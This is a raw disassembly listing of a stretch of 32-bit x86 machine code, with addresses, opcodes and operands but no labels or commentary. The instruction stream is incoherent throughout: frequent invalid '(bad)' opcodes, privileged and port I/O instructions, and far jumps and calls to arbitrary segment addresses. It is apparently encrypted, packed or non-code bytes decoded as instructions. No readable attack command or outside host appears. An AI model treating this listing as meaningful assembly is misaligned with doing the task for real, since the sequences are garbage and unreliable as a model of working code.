  416f09:	cmp    eax,0xeedcbdbc
  416f0e:	call   0x216e:0x3faabf0e
  416f15:	jle    0x416f4c
  416f17:	fstp   DWORD PTR [ebx-0x70f86837]
  416f1d:	sub    cl,BYTE PTR [edi-0x4c]
  416f20:	nop
  416f21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f22:	ret    
  416f23:	in     al,dx
  416f24:	push   ds
  416f25:	aaa    
  416f26:	and    DWORD PTR [ebx+eax*4-0x2],esp
  416f2a:	data16 jg 0x416ed9
  416f2d:	adc    DWORD PTR [edi-0x5e],0x29
  416f31:	(bad)  
  416f33:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  416f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f36:	xor    bh,BYTE PTR [esp+ecx*4]
  416f39:	push   ebp
  416f3a:	setnp  bh
  416f3d:	retf   
  416f3e:	xor    al,0x2f
  416f40:	mov    esp,0x881fce64
  416f45:	aam    0xc4
  416f47:	jmp    0xd7e9:0x890f22cf
  416f4e:	jne    0x416f94
  416f50:	mov    WORD PTR [ebp+0x40634b33],?
  416f56:	push   0x70
  416f58:	cmp    DWORD PTR [ecx+0x1c],0xffffff83
  416f5c:	lods   eax,DWORD PTR ds:[esi]
  416f5d:	popa   
  416f5e:	and    al,BYTE PTR [esp+edi*4]
  416f61:	mov    edx,0xa1947c8d
  416f66:	push   esi
  416f67:	je     0x416f72
  416f69:	xrelease mov BYTE PTR [edi+0x17],dh
  416f6d:	mov    bl,0xff
  416f6f:	sbb    BYTE PTR [ecx-0x1f],dh
  416f72:	cli    
  416f73:	jb     0x416f23
  416f75:	and    esp,ecx
  416f77:	lods   eax,DWORD PTR ds:[esi]
  416f78:	mov    BYTE PTR [esi],bh
  416f7a:	lock hlt 
  416f7c:	outs   dx,DWORD PTR ds:[esi]
  416f7d:	lods   eax,DWORD PTR ds:[esi]
  416f7e:	mov    ds:0xabe1c8d,al
  416f83:	test   al,0x9e
  416f85:	int    0xe8
  416f87:	and    al,0xb
  416f89:	inc    edx
  416f8a:	jne    0x416f64
  416f8c:	add    DWORD PTR [ecx+0x6ecbd610],ebx
  416f92:	mov    bh,0x93
  416f94:	jns    0x416f50
  416f96:	push   esp
  416f97:	ret    
  416f98:	mov    dl,bh
  416f9a:	sub    esi,ebx
  416f9c:	cmp    edi,esp
  416f9e:	es push es
  416fa0:	aad    0x4b
  416fa2:	icebp  
  416fa3:	mov    ds:0x3d45785f,al
  416fa8:	adc    DWORD PTR [ebx],0x3f
  416fab:	(bad)  [eax-0xcd48353]
  416fb1:	in     al,0xb0
  416fb3:	sbb    ch,BYTE PTR [edx+0x7f6fbc05]
  416fb9:	inc    esi
  416fba:	jmp    0x4def8451
  416fbf:	ins    DWORD PTR es:[edi],dx
  416fc0:	enter  0xf43b,0x4b
  416fc4:	jae    0x417000
  416fc6:	push   0x9a4fda1c
  416fcb:	retf   0x8425
  416fce:	outs   dx,BYTE PTR ds:[esi]
  416fcf:	outs   dx,BYTE PTR ds:[esi]
  416fd0:	push   ebx
  416fd1:	test   BYTE PTR [ebx],ah
  416fd3:	pop    ebx
  416fd4:	sbb    DWORD PTR [ebp+0x2d],0xa49e09d1
  416fdb:	xor    BYTE PTR [eax+0x62],cl
  416fde:	(bad)  
  416fdf:	push   ds
  416fe0:	jg     0x41701e
  416fe2:	xor    BYTE PTR [ebp+0xb],dh
  416fe5:	int    0x5e
  416fe7:	mov    ebx,0x83cde075
  416fec:	call   0x23a0271a
  416ff1:	lss    ebx,FWORD PTR [eax]
  416ff4:	sahf   
  416ff5:	call   0x9b06:0x5b8a4ef5
  416ffc:	mov    eax,ds:0xf0858211
  417001:	mov    esp,0x527278a6
  417006:	iret   
  417007:	sub    bh,BYTE PTR ds:0x8e61e205
  41700d:	mov    esi,0xe58e0a45
  417012:	adc    DWORD PTR [edx],eax
  417014:	sbb    ch,BYTE PTR ds:0x9ec85574
  41701a:	or     BYTE PTR [edi+0x45],ch
  41701d:	fild   DWORD PTR [edx+0x6a1f689]
  417023:	inc    ecx
  417024:	xor    BYTE PTR [esi-0x2f1785ac],bl
  41702a:	push   edi
  41702b:	or     bh,ch
  41702d:	and    ch,BYTE PTR [edx+ebx*8]
  417030:	outs   dx,BYTE PTR ds:[esi]
  417031:	mov    eax,ds:0x7a89d332
  417036:	or     esp,DWORD PTR [si+0x38]
  41703a:	retf   0xfdf7
  41703d:	aas    
  41703e:	mov    bl,0x86
  417040:	cli    
  417041:	mov    bl,bl
  417043:	imul   edx,ebp,0xf3d6fcad
  417049:	inc    edi
  41704a:	pop    ebx
  41704b:	push   ebp
  41704c:	out    dx,eax
  41704d:	retf   0xc247
  417050:	fidivr DWORD PTR [ecx+esi*1-0x6a]
  417054:	push   es
  417055:	sbb    BYTE PTR [ecx-0x39e5e926],dl
  41705b:	rcr    BYTE PTR [edx+0x1b],cl
  41705e:	jbe    0x4170a2
  417060:	aaa    
  417061:	aad    0xef
  417063:	sbb    bh,dh
  417065:	dec    ebx
  417066:	sub    BYTE PTR [esi+eiz*1-0x4d],0x9e
  41706b:	push   0x83b81ee4
  417070:	retf   
  417071:	dec    esi
  417072:	cmp    dh,BYTE PTR [esi]
  417074:	call   0x3882b90b
  417079:	cli    
  41707a:	pop    ebx
  41707b:	add    al,0xf3
  41707d:	es add eax,0x8df6363f
  417083:	aad    0x4b
  417085:	xchg   BYTE PTR [edx],dl
  417087:	dec    eax
  417088:	add    cl,dl
  41708a:	(bad)  
  41708b:	gs sti 
  41708d:	cwde   
  41708e:	or     esp,edi
  417090:	lods   al,BYTE PTR ds:[esi]
  417091:	and    ah,BYTE PTR ss:[ebx-0x5de00201]
  417098:	xchg   ecx,eax
  417099:	hlt    
  41709a:	mov    eax,DWORD PTR [edx+0x20]
  41709d:	loop   0x417061
  41709f:	mov    ss,WORD PTR [ecx+0x3e]
  4170a2:	jmp    0x7bfe:0xf5326750
  4170a9:	sbb    al,0x51
  4170ab:	mov    dl,0x88
  4170ad:	xor    eax,0xe66f5694
  4170b2:	sub    eax,0x5e39b9a4
  4170b7:	mov    ecx,DWORD PTR [edx]
  4170b9:	jb     0x4170e6
  4170bb:	push   ebp
  4170bc:	mov    bh,0x6
  4170be:	add    al,0x10
  4170c0:	cwde   
  4170c1:	xchg   ebx,eax
  4170c2:	in     eax,dx
  4170c3:	js     0x41711f
  4170c5:	push   eax
  4170c6:	mov    ss,WORD PTR [ebx-0x27]
  4170c9:	jnp    0x41708b
  4170cb:	pop    es
  4170cc:	or     DWORD PTR [edx-0x32466a4c],ecx
  4170d2:	inc    esp
  4170d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170d4:	aaa    
  4170d5:	mov    cl,0xd7
  4170d8:	mov    ecx,DWORD PTR [ebx-0x42]
  4170db:	pop    eax
  4170dc:	fadd   QWORD PTR [eax]
  4170de:	adc    al,0x2e
  4170e0:	adc    edi,DWORD PTR [ebp+0xf6f1803]
  4170e6:	jmp    0x82ee:0xfa645748
  4170ed:	test   edi,esi
  4170ef:	push   eax
  4170f0:	push   cs
  4170f1:	scas   eax,DWORD PTR es:[edi]
  4170f2:	mov    esp,0x20d1f067
  4170f7:	add    al,0xb0
  4170f9:	pop    ds
  4170fa:	mov    esp,0x111bf6c2
  4170ff:	ror    dh,1
  417101:	and    al,0x53
  417103:	pop    edx
  417104:	mov    bl,0x94
  417106:	out    0xb2,eax
  417108:	fdivp  st(6),st
  41710a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41710b:	in     eax,dx
  41710c:	ds ja  0x41712c
  41710f:	iret   
  417110:	jle    0x417102
  417112:	xor    ecx,DWORD PTR [ebp+0x259e4981]
  417118:	push   0x9272b086
  41711d:	sub    eax,0xb00f0f6
  417122:	add    ecx,esi
  417124:	add    ch,BYTE PTR [edi-0x4]
  417127:	clc    
  417128:	pop    esi
  417129:	sbb    esp,ebp
  41712b:	scas   eax,DWORD PTR es:[edi]
  41712c:	(bad)  
  41712d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41712e:	addr16 cmp eax,0x7abb7eed
  417134:	mov    DWORD PTR [ecx+0x4f],edi
  417137:	pop    edi
  417138:	enter  0x4090,0xa6
  41713c:	aam    0x5d
  41713e:	jne    0x41716b
  417140:	scas   al,BYTE PTR es:[edi]
  417141:	or     al,0x76
  417143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417144:	sub    al,0xff
  417146:	push   0x71
  417148:	or     BYTE PTR [esi],dh
  41714a:	movd   DWORD PTR [ebp+0x8],mm2
  41714e:	dec    DWORD PTR [ecx]
  417150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417151:	or     al,0x55
  417153:	mov    ds:0x715d3122,eax
  417158:	(bad)  
  417159:	xchg   esi,eax
  41715a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41715b:	hlt    
  41715c:	sub    eax,0x16b39060
  417161:	xchg   esp,eax
  417162:	es cmp ah,ch
  417165:	or     BYTE PTR ds:[esi-0x54],ch
  417169:	jl     0x4170f6
  41716b:	(bad)  
  41716c:	xor    eax,0x1caca21a
  417171:	xchg   esi,eax
  417172:	sbb    al,0x1a
  417174:	mov    eax,0xb6c55be8
  417179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41717a:	arpl   WORD PTR [edi+0x1f],dx
  41717d:	jo     0x417191
  41717f:	mov    ah,0xb8
  417181:	iret   
  417182:	inc    ebp
  417183:	pop    es
  417184:	and    al,BYTE PTR [esi-0x6e]
  417187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417188:	(bad)  
  417189:	pop    ebp
  41718a:	cs jnp 0x41710f
  41718d:	outs   dx,DWORD PTR ds:[esi]
  41718e:	jb     0x417163
  417190:	jmp    0xd66d:0xab487c08
  417197:	lahf   
  417198:	mov    WORD PTR [ecx-0x68],es
  41719b:	mov    DWORD PTR [ebx],ecx
  41719d:	ret    0x1803
  4171a0:	and    BYTE PTR [eax-0x5566578],bh
  4171a6:	es jl  0x4171c8
  4171a9:	jmp    0x8e99:0x5c86905d
  4171b0:	push   es
  4171b1:	cmp    DWORD PTR [ecx+0x74],0x5f9b0c20
  4171b8:	call   0xababa2e2
  4171bd:	fwait
  4171be:	cli    
  4171bf:	xchg   DWORD PTR [edx+0x21],esi
  4171c2:	jno    0x417144
  4171c4:	jle    0x417151
  4171c6:	xchg   ebp,eax
  4171c7:	adc    bl,bl
  4171c9:	mov    ebp,0xdc2f6073
  4171ce:	ret    0xfc2b
  4171d1:	mov    edi,0x68376393
  4171d6:	out    dx,al
  4171d7:	mov    al,ds:0x14fd2532
  4171dc:	cmp    eax,0xfd1f5209
  4171e1:	ja     0x417236
  4171e3:	and    cl,BYTE PTR [ebp+eiz*8+0x434bc799]
  4171ea:	xor    ah,BYTE PTR [edi-0x585b511f]
  4171f0:	pop    ecx
  4171f1:	push   esi
  4171f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171f3:	or     esi,DWORD PTR [eax]
  4171f5:	lea    esi,[ecx+0x496f4064]
  4171fb:	adc    BYTE PTR [ebx+0x41],0x38
  4171ff:	mov    WORD PTR [eax],?
  417201:	mov    dh,0x17
  417203:	pop    ecx
  417204:	and    DWORD PTR [ecx-0x29bd6c9d],esp
  41720a:	push   ds
  41720b:	bound  edi,QWORD PTR [ebx+0x56]
  41720e:	and    al,0x38
  417210:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  417212:	ja     0x41722c
  417214:	push   ds
  417215:	mov    al,0xd8
  417217:	sbb    eax,DWORD PTR ds:0x2a057a84
  41721d:	push   ecx
  41721e:	cmp    al,0x99
  417220:	push   ss
  417221:	pop    eax
  417222:	stos   DWORD PTR es:[edi],eax
  417223:	retf   
  417224:	xor    BYTE PTR [esi-0x1e],bh
  417227:	fnstsw WORD PTR [esi+edi*8]
  41722a:	jb     0x41729b
  41722c:	dec    eax
  41722d:	sub    DWORD PTR [ebx-0x1f24abb],eax
  417233:	and    ah,ch
  417235:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  417237:	or     al,0x70
  417239:	in     al,0x19
  41723b:	(bad)  
  41723c:	shl    DWORD PTR [ebx],cl
  41723e:	fwait
  41723f:	sbb    ah,0x4e
  417242:	fs push ds
  417244:	ins    DWORD PTR es:[edi],dx
  417245:	pop    esp
  417246:	cdq    
  417247:	inc    esi
  417248:	mov    esp,0xaba42215
  41724d:	(bad)  
  41724e:	sbb    DWORD PTR [ebx+0x46df8af9],eax
  417254:	mov    WORD PTR [ecx+edx*8-0x1],es
  417258:	int    0x47
  41725a:	dec    esp
  41725b:	mov    ds:0xf148a80,al
  417260:	jl     0x4172ca
  417262:	sbb    DWORD PTR [edx-0x45],esi
  417265:	call   0xd7fb3f34
  41726a:	pop    eax
  41726b:	into   
  41726c:	sub    BYTE PTR [edx],ch
  41726e:	std    
  41726f:	push   0xf52eb69e
  417274:	dec    eax
  417275:	dec    eax
  417276:	loopne 0x41728b
  417278:	sub    al,bl
  41727a:	xchg   esi,eax
  41727b:	push   0xffffffd0
  41727d:	stc    
  41727e:	dec    eax
  41727f:	inc    edi
  417280:	xchg   bl,bl
  417282:	mov    bl,0xe4
  417284:	and    al,0x4f
  417286:	jecxz  0x41720d
  417288:	test   edx,ecx
  41728a:	hlt    
  41728b:	out    dx,eax
  41728c:	cmp    BYTE PTR [ebx+0x54e8c6e3],cl
  417292:	mov    DWORD PTR [ebp-0x15],edi
  417295:	lds    eax,FWORD PTR [edx+0x2f]
  417298:	fscale 
  41729a:	cmp    edi,DWORD PTR [ebp-0x6e52398d]
  4172a0:	out    dx,eax
  4172a1:	out    dx,eax
  4172a2:	add    ch,BYTE PTR [edx-0x1a85dfc1]
  4172a8:	in     al,0x50
  4172aa:	enter  0xe1d7,0x57
  4172ae:	dec    esp
  4172af:	lods   al,BYTE PTR ds:[esi]
  4172b0:	imul   esi,DWORD PTR [ebp+0x1c24a399],0x16
  4172b7:	scas   eax,DWORD PTR es:[edi]
  4172b8:	mov    ecx,0xf2b582c2
  4172bd:	dec    ecx
  4172be:	pop    eax
  4172bf:	jb     0x4172ea
  4172c1:	or     ah,BYTE PTR [edx+0x3b525986]
  4172c7:	jne    0x417329
  4172c9:	aam    0xc3
  4172cb:	ss adc edx,edx
  4172ce:	adc    bh,cl
  4172d0:	push   es
  4172d1:	fiadd  DWORD PTR [eax-0x4]
  4172d4:	mov    bl,BYTE PTR [edi+0x49]
  4172d7:	sti    
  4172d8:	fld1   
  4172da:	xchg   DWORD PTR ds:0x9a06a118,ecx
  4172e0:	in     al,0x2f
  4172e2:	test   ebx,esi
  4172e4:	imul   ebp,edi,0xffffff8e
  4172e7:	test   BYTE PTR [ebx+0x33],cl
  4172ea:	inc    edx
  4172eb:	add    esp,DWORD PTR [ebx-0x59]
  4172ee:	(bad)  
  4172ef:	mov    al,0x80
  4172f1:	enter  0x58d6,0xe4
  4172f5:	arpl   WORD PTR [esi-0x27794faf],dx
  4172fb:	mov    al,0xab
  4172fd:	icebp  
  4172fe:	test   DWORD PTR [esi+ebp*1+0x49ede5ab],edi
  417305:	retf   
  417306:	int3   
  417307:	sub    ebp,edx
  417309:	cmp    BYTE PTR [ebp-0xc],dh
  41730c:	or     eax,0xff6677bd
  417311:	xchg   ecx,eax
  417312:	int    0x53
  417314:	inc    eax
  417315:	cmp    eax,0xa16118d9
  41731a:	push   ebx
  41731b:	cmp    DWORD PTR [edx+0x635d1fd4],0x7a
  417322:	dec    esi
  417323:	iret   
  417324:	(bad)  
  417326:	inc    ebp
  417327:	and    ah,BYTE PTR [eax+eiz*8]
  41732a:	dec    edx
  41732b:	add    sp,WORD PTR [edx]
  41732e:	out    dx,al
  41732f:	add    al,BYTE PTR [eax-0x20816995]
  417335:	ret    0x2029
  417338:	jo     0x4173a0
  41733a:	(bad)  
  41733b:	in     eax,dx
  41733c:	mov    dh,ah
  41733e:	fmul   QWORD PTR fs:[eax]
  417341:	out    0x11,eax
  417343:	outs   dx,BYTE PTR ds:[esi]
  417344:	inc    ecx
  417345:	pop    ds
  417346:	bound  eax,QWORD PTR ds:0xc48f47df
  41734c:	push   ebp
  41734d:	inc    ecx
  41734e:	ret    
  41734f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417350:	ins    DWORD PTR es:[edi],dx
  417351:	in     eax,dx
  417352:	pop    ds
  417353:	icebp  
  417354:	jae    0x417352
  417356:	push   esp
  417357:	jne    0x417317
  417359:	xor    cl,al
  41735b:	les    edx,FWORD PTR [ecx+esi*1+0x3fd1013a]
  417362:	or     ebp,ecx
  417364:	aam    0xa0
  417366:	pop    esp
  417367:	ins    DWORD PTR es:[edi],dx
  417368:	mov    ch,0x71
  41736a:	ja     0x41731d
  41736c:	mov    cl,0xbb
  41736e:	out    dx,eax
  41736f:	and    ecx,DWORD PTR [ebx-0x3f]
  417372:	pop    eax
  417373:	in     al,dx
  417374:	pop    ebx
  417375:	(bad)  
  417376:	jns    0x4173c2
  417378:	retf   
  417379:	adc    dl,BYTE PTR [ebx+0x70]
  41737c:	std    
  41737d:	and    al,0x45
  41737f:	mov    al,0x91
  417381:	je     0x4173be
  417383:	adc    ecx,DWORD PTR [ebp+ebp*8+0x76]
  417387:	xchg   ebp,eax
  417388:	pop    eax
  417389:	jno    0x4173c3
  41738b:	push   edi
  41738c:	inc    ebp
  41738d:	fsub   QWORD PTR [eax+0x62]
  417390:	dec    esi
  417391:	ret    0xf566
  417394:	adc    al,0xf9
  417396:	out    dx,al
  417397:	mov    ah,0x10
  417399:	or     bh,BYTE PTR [ebp+0x4a]
  41739c:	lods   eax,DWORD PTR ds:[esi]
  41739d:	cmp    BYTE PTR [ebx-0x4dac825f],bh
  4173a3:	sbb    eax,0x83ca64af
  4173a8:	je     0x4173e1
  4173aa:	sub    ah,BYTE PTR [ebx-0x1d]
  4173ad:	or     ebx,0x25c7dd5
  4173b3:	and    eax,0xae64d9ae
  4173b8:	std    
  4173b9:	sbb    BYTE PTR [edx+0x37],0x14
  4173bd:	mov    esp,0x895a615a
  4173c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173c3:	or     al,0x21
  4173c6:	aad    0x4e
  4173c8:	sahf   
  4173c9:	repnz imul esi
  4173cc:	pop    ss
  4173cd:	sub    BYTE PTR [edx+esi*8],dl
  4173d0:	add    BYTE PTR [esi+0x627245f7],dl
  4173d6:	adc    ch,dl
  4173d8:	pop    ecx
  4173d9:	xchg   edi,eax
  4173da:	sbb    edi,DWORD PTR [ebx]
  4173dc:	in     al,dx
  4173dd:	xchg   edx,eax
  4173de:	lock xor DWORD PTR [eax-0x120e31e1],esp
  4173e5:	and    DWORD PTR [edi+0x78],edi
  4173e8:	pop    DWORD PTR [ebx+0x618b7495]
  4173ee:	fldenv es:[edx-0x38]
  4173f2:	stos   DWORD PTR es:[edi],eax
  4173f3:	xor    BYTE PTR [edi+0x42],ch
  4173f6:	subps  xmm7,XMMWORD PTR [eax+0x2547da2b]
  4173fd:	outs   dx,BYTE PTR ds:[esi]
  4173fe:	mov    edx,0x53a3edd1
  417403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417404:	outs   dx,BYTE PTR ds:[esi]
  417405:	pop    ss
  417406:	repnz xor eax,DWORD PTR ss:0x3905f571
  41740e:	jmp    0xe96a7dab
  417413:	push   esp
  417414:	test   eax,0x82e2435f
  417419:	and    al,0x47
  41741b:	jae    0x417425
  41741d:	std    
  41741e:	or     eax,0x8ae02ebe
  417423:	pop    edi
  417424:	xchg   edx,eax
  417425:	int    0xe2
  417427:	cs (bad) 
  417429:	lods   eax,DWORD PTR ds:[esi]
  41742a:	xor    eax,0x22e0fbb7
  41742f:	adc    al,0xde
  417431:	add    dl,bl
  417433:	outs   dx,DWORD PTR ds:[esi]
  417434:	rcr    BYTE PTR [edi-0x1f],cl
  417437:	les    esp,FWORD PTR [ebx+0x66705682]
  41743d:	(bad)  
  41743e:	xchg   ebp,eax
  41743f:	xlat   BYTE PTR ds:[ebx]
  417440:	sbb    al,0x21
  417442:	fimul  DWORD PTR [ebp-0x1b6f9691]
  417448:	adc    DWORD PTR [edi+edi*1-0x3f],ecx
  41744c:	push   eax
  41744d:	or     dl,BYTE PTR [eax+esi*8+0x64]
  417451:	jle    0x41749e
  417453:	mov    ebp,0x64e37cf9
  417458:	add    esp,DWORD PTR [ebx+0x28]
  41745b:	xchg   esp,eax
  41745c:	call   DWORD PTR [edx-0x10]
  41745f:	sub    eax,0xae2ffe46
  417464:	sbb    ebx,ecx
  417466:	jmp    FWORD PTR [esi*4+0x26b31928]
  41746d:	leave  
  41746e:	in     al,0xa7
  417470:	rol    bl,1
  417472:	lds    ebp,FWORD PTR [edi-0x3c]
  417475:	mov    ds,WORD PTR [ecx+0x3e31f9a4]
  41747b:	inc    ebx
  41747c:	in     eax,0x9e
  41747e:	aaa    
  41747f:	out    0x28,al
  417481:	cmp    ch,al
  417483:	or     DWORD PTR [ebp-0x31],edi
  417486:	iret   
  417487:	lea    ebx,[esi]
  417489:	mov    ch,0xa4
  41748b:	jne    0x417501
  41748d:	clc    
  41748e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41748f:	and    BYTE PTR [ebx-0xe49afbf],bh
  417495:	cli    
  417496:	or     BYTE PTR [ebx+edx*2-0x13],dl
  41749a:	jmp    0xa187e7d1
  41749f:	adc    al,0x3a
  4174a1:	hlt    
  4174a2:	cmp    eax,0x52c097b2
  4174a7:	in     eax,0xa5
  4174a9:	push   ecx
  4174aa:	out    0x59,eax
  4174ac:	in     eax,dx
  4174ad:	shr    BYTE PTR [eax*8-0x454ab78f],cl
  4174b4:	shr    ebx,cl
  4174b6:	inc    ebp
  4174b7:	push   0x25
  4174b9:	push   ds
  4174ba:	jbe    0x417448
  4174bc:	cmp    BYTE PTR [edi-0x3aa3fb3e],bh
  4174c2:	pop    ebx
  4174c3:	and    dl,bl
  4174c5:	push   ebx
  4174c6:	sbb    dh,BYTE PTR [ebp+0x48d0d19d]
  4174cc:	inc    ebx
  4174cd:	or     bh,bh
  4174cf:	sbb    al,0xcc
  4174d1:	dec    ebx
  4174d2:	stc    
  4174d3:	int3   
  4174d4:	sub    eax,0x5af5a0e4
  4174d9:	leave  
  4174da:	lods   eax,DWORD PTR ds:[esi]
  4174db:	ret    
  4174dc:	sbb    BYTE PTR [ecx],bh
  4174de:	mul    BYTE PTR [eax]
  4174e0:	fmul   st(3),st
  4174e2:	jg     0x417479
  4174e4:	aad    0xcf
  4174e6:	dec    esp
  4174e7:	push   es
  4174e8:	adc    eax,0xc60c3580
  4174ed:	add    DWORD PTR [eax+0x4e532469],0xb
  4174f4:	cmp    al,0x82
  4174f6:	push   cs
  4174f7:	jmp    DWORD PTR [edi+esi*8]
  4174fa:	xor    DWORD PTR [ecx],0xfffffff6
  4174fd:	jne    0x4174a0
  4174ff:	mov    ebx,0xe39dad6a
  417504:	nop
  417505:	mov    ah,0x83
  417507:	add    ecx,DWORD PTR [edx+0x77]
  41750a:	xchg   ebp,eax
  41750b:	div    BYTE PTR [esi+0x4825791e]
  417511:	jl     0x41758e
  417513:	and    ebx,DWORD PTR [ebx]
  417515:	inc    ebx
  417516:	mov    edx,0xe6b9e0c8
  41751b:	mov    al,0xe5
  41751d:	and    BYTE PTR [edi+0x4c62be0a],bh
  417523:	(bad)  
  417525:	popa   
  417526:	push   0x660c309c
  41752b:	or     BYTE PTR ds:0xadcb0a85,cl
  417531:	sbb    BYTE PTR [eax-0x68],ah
  417534:	(bad)  [esi+0xe]
  417537:	test   BYTE PTR [ebx],bl
  417539:	int    0x35
  41753b:	adc    esi,ecx
  41753d:	adc    edi,DWORD PTR [eax-0x15]
  417540:	test   BYTE PTR [edi-0x51793d77],0x1d
  417547:	push   0xfffffff1
  417549:	aam    0x57
  41754b:	jge    0x4175c8
  41754d:	and    BYTE PTR [ecx+edi*8+0x71],0x1f
  417552:	das    
  417553:	and    eax,0x2f862cf6
  417558:	and    al,0x4b
  41755a:	sbb    BYTE PTR [edx],cl
  41755c:	das    
  41755d:	(bad)  
  41755e:	jo     0x41757d
  417560:	or     esi,ebx
  417562:	enter  0x8d55,0xae
  417566:	push   0x3f
  417568:	into   
  417569:	jl     0x417584
  41756b:	es dec edi
  41756d:	loop   0x41754c
  41756f:	push   ds
  417570:	sbb    al,0x30
  417572:	fcmovbe st,st(2)
  417574:	push   eax
  417575:	sub    bl,ah
  417577:	loop   0x4175dc
  417579:	lds    edi,FWORD PTR [esi+ebx*4-0x24bc7456]
  417580:	mov    eax,ds:0x79162fb9
  417585:	xchg   ebp,eax
  417586:	push   ss
  417587:	dec    ecx
  417588:	std    
  417589:	lods   eax,DWORD PTR ds:[esi]
  41758a:	retf   
  41758b:	fsub   QWORD PTR [eax-0x6e]
  41758e:	push   ebx
  41758f:	mov    ebp,0x42514f92
  417594:	retf   0x2156
  417597:	mov    al,ds:0x6ca7e7cc
  41759c:	ret    0xe6fb
  41759f:	mov    ebp,0x6ada6e41
  4175a4:	sbb    eax,0xebca0580
  4175a9:	jo     0x417591
  4175ab:	cmp    edi,DWORD PTR [edi]
  4175ad:	sbb    DWORD PTR [ecx-0x5e],edi
  4175b0:	push   ecx
  4175b1:	push   cs
  4175b2:	mov    ah,0xf9
  4175b4:	nop
  4175b5:	mov    WORD PTR [esi-0x7c],fs
  4175b8:	das    
  4175b9:	xor    eax,DWORD PTR [edi]
  4175bb:	and    ebx,DWORD PTR [edx+ecx*8+0x1ad83283]
  4175c2:	inc    edi
  4175c3:	push   eax
  4175c4:	mov    DWORD PTR [edx-0x41],esi
  4175c7:	adc    edi,ebx
  4175c9:	sub    BYTE PTR [esi+0x44d30be4],0x32
  4175d0:	dec    esp
  4175d1:	fidivr WORD PTR [ecx-0x17d4d990]
  4175d7:	mov    bh,0xec
  4175d9:	xchg   ecx,eax
  4175da:	pop    ecx
  4175db:	mov    dl,0xe3
  4175dd:	retf   
  4175de:	shl    BYTE PTR [edi+0x2c11f0f6],cl
  4175e4:	inc    edx
  4175e5:	stos   BYTE PTR es:[edi],al
  4175e6:	retf   
  4175e7:	arpl   WORD PTR [esi+0x518e617e],bp
  4175ed:	inc    esi
  4175ee:	stc    
  4175ef:	arpl   WORD PTR ds:0x5205ebae,cx
  4175f5:	sbb    DWORD PTR [esi],edi
  4175f7:	call   0x1d22:0xa2011e8b
  4175fe:	mov    ds:0xc80021bd,eax
  417603:	push   ebp
  417604:	sti    
  417605:	in     al,dx
  417606:	adc    al,0x7d
  417608:	test   DWORD PTR [edx-0x68813c85],ebx
  41760e:	fisubr DWORD PTR [ebp+0x374bc2e5]
  417614:	repz dec esi
  417616:	cmc    
  417617:	in     eax,0x36
  417619:	add    esi,DWORD PTR [edx]
  41761b:	pop    es
  41761c:	js     0x4175ae
  41761e:	xor    eax,0xa93b3669
  417623:	adc    eax,0x906f8de
  417628:	aaa    
  417629:	dec    esi
  41762a:	xchg   BYTE PTR [edi],ah
  41762c:	imul   edx,DWORD PTR [eax],0x35
  41762f:	mov    DWORD PTR [esi],esi
  417631:	xchg   edx,eax
  417632:	scas   al,BYTE PTR es:[edi]
  417633:	sahf   
  417634:	adc    DWORD PTR [edx],eax
  417636:	pop    esp
  417637:	adc    BYTE PTR [esi-0x4e],bl
  41763a:	or     DWORD PTR [edi+0x4b],eax
  41763d:	pop    ds
  41763e:	xor    bl,dl
  417640:	add    al,0x50
  417642:	push   ecx
  417643:	xchg   ecx,eax
  417644:	cmp    DWORD PTR [eax+0x18055bac],0x156c005e
  41764e:	sbb    esp,DWORD PTR [eax]
  417650:	addr16 jae 0x417641
  417653:	lods   al,BYTE PTR ds:[esi]
  417654:	test   bh,dh
  417656:	push   0x5a
  417658:	dec    edx
  417659:	rcl    ebx,0xf2
  41765c:	mov    al,ds:0xfe612e67
  417661:	dec    ebp
  417662:	jmp    0x417645
  417664:	sub    esp,ecx
  417666:	fadd   QWORD PTR [ecx-0x520607bf]
  41766c:	and    DWORD PTR [ebx+0x54bb3757],edx
  417672:	int    0xab
  417674:	sbb    al,0xaa
  417676:	xchg   ebx,eax
  417677:	test   eax,0xadfea70f
  41767c:	add    al,BYTE PTR [edi+0x6bd24bd8]
  417682:	fidivr DWORD PTR [ebx+0x54]
  417685:	or     ch,BYTE PTR [esi+0x16e9f001]
  41768b:	daa    
  41768c:	jle    0x417689
  41768e:	ret    0xfce9
  417691:	xor    ebp,edi
  417693:	ds pusha 
  417695:	push   0x2b0c836f
  41769a:	cmp    DWORD PTR [esi+0x67],ebx
  41769d:	out    0xaa,al
  41769f:	ret    0x446b
  4176a2:	repz sahf 
  4176a4:	cli    
  4176a5:	fwait
  4176a6:	scas   al,BYTE PTR es:[edi]
  4176a7:	gs inc edi
  4176a9:	(bad)  
  4176aa:	test   al,0x97
  4176ac:	retf   
  4176ad:	sub    DWORD PTR [esi-0x6c70137d],0x26
  4176b4:	fwait
  4176b5:	shr    ah,cl
  4176b7:	inc    edx
  4176b8:	nop
  4176b9:	pop    DWORD PTR [edx+0x1e]
  4176bc:	mov    ecx,0x43acc236
  4176c1:	add    ecx,ebp
  4176c3:	imul   edx,DWORD PTR [edi],0x2c
  4176c6:	loopne 0x41765f
  4176c8:	mov    cl,0xd6
  4176ca:	jae    0x41770b
  4176cc:	jg     0x417736
  4176ce:	dec    ebx
  4176cf:	ficomp WORD PTR [eax-0x61]
  4176d2:	popf   
  4176d3:	out    0x73,al
  4176d5:	pop    edx
  4176d6:	mov    bh,0xbe
  4176d8:	(bad)  
  4176d9:	call   0x128132a5
  4176de:	xor    al,ah
  4176e0:	jmp    0xaf6:0x40a8fa7e
